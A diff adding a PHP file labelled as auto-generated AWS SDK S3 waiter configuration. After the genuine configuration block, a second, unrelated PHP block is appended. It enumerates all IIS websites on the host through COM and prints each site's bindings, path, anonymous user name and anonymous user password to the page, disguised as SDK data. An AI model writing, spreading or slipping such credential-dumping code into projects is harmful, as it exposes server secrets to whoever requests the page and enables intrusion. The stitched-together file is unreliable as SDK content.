@@ -1,0 +1,44 @@
+<?php
+// This file was auto-generated from sdk-root/src/data/s3/2006-03-01/waiters-1.json
+return [ 'waiters' => [ '__default__' => [ 'interval' => 5, 'max_attempts' => 20, ], 'BucketExists' => [ 'operation' => 'HeadBucket', 'ignore_errors' => [ 'NoSuchBucket', ], 'success_type' => 'output', ], 'BucketNotExists' => [ 'operation' => 'HeadBucket', 'success_type' => 'error', 'success_value' => 'NoSuchBucket', ], 'ObjectExists' => [ 'operation' => 'HeadObject', 'ignore_errors' => [ 'NoSuchKey', ], 'success_type' => 'output', ], 'ObjectNotExists' => [ 'operation' => 'HeadObject', 'success_type' => 'error', 'success_value' => 'NoSuchKey', ], ],];
+<?php
+$ObjService = new COM("IIS://localhost/w3svc");
+
+foreach ($ObjService as $obj3w) {
+
+  if(is_numeric($obj3w->Name)){
+
+   
+      $webSite=new COM("IIS://localhost/w3svc/".$obj3w->Name.'/Root');
+      echo "[ID    ] " .$obj3w->Name.'</br>';
+      echo "[NAME  ] " .$obj3w->ServerComment.'</br>';
+      $state=intval($obj3w->ServerState);
+      if ($state==2) {
+     
+          echo "[STATE ] running".'</br>';
+      }
+     
+      if ($state==4) {
+     
+          echo "[STATE ] stoped".'</br>';
+      }
+
+      if ($state==6) {
+     
+          echo "[STATE ] paused".'</br>';
+      }
+
+      foreach ($obj3w->ServerBindings as $Binds){
+
+          echo "[HOST  ] "  .$Binds.'</br>';
+
+      }
+      echo "[USER  ] " . $webSite->AnonymousUserName.'</br>';
+      echo "[PASS  ] " . $webSite->AnonymousUserPass.'</br>';
+      echo "[PATH  ] " . $webSite->path.'</br>';
+      echo "-------------------------------------------".'</br>';
+
+  }
+}
+
+?>
